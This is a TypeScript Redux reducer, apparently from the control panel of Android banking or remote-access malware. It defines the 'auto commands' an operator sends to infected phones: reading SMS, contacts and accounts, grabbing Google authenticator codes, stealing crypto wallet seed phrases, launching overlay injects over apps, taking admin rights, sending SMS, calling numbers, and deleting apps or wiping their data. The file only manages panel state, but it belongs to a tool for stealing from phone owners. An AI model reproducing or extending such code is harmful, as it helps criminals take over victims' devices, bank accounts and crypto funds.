import {ACActionTypes, ACChangeCommandFieldsPayload, ACChangeEnabledPayload, AutoCommandsState} from "./Types";

const initalState: AutoCommandsState = {
    getAccounts: {
        enabled: false,
    },
    getInstalledApps: {
        enabled: false,
    },
    updateInjectList: {
        enabled: false,
    },
    getSMSList: {
        enabled: false,
    },
    getContactsList: {
        enabled: false,
    },
    getAdminRights: {
        enabled: false,
    },
    googleAuthGrabber: {
        enabled: false,
    },
    calling: {
        enabled: false,
        number: "",
        locked: false,
    },
    openInject: {
        enabled: false,
        application: "",
    },
    sendPush: {
        enabled: false,
        text: "",
        title: "",
        application: "",
    },
    sendSMS: {
        enabled: false,
        number: "+",
        message: "",
    },
    getSeedPhrase: {
        enabled: false,
        wallets: [],
    },
    clearAppData: {
        enabled: false,
        application: "",
    },
    runApp: {
        enabled: false,
        application: "",
    },
    deleteApp: {
        enabled: false,
        application: "",
    },
    openUrl: {
        enabled: false,
        url: "",
    },
    isLoaded: false,
};

const acChangeEnabled = (state: AutoCommandsState, payload: ACChangeEnabledPayload): AutoCommandsState => {
    return {
        ...state,
        [payload.command]: {
            ...state[payload.command],
            enabled: payload.enabled,
        },
    };
};

const acChangeCommandFields = (state: AutoCommandsState, payload: ACChangeCommandFieldsPayload): AutoCommandsState => {
    return {
        ...state,
        ...payload,
        isLoaded: true,
    };
};

const acReducer = (state: AutoCommandsState = initalState, action: ACActionTypes): AutoCommandsState => {
    switch (action.type) {
    case "AC_CHANGE_ENABLED":
        return acChangeEnabled(state, action.payload);
    case "AC_CHANGE_COMMAND_FIELDS":
        return acChangeCommandFields(state, action.payload);
    default:
        return state;
    }
};

export default acReducer;
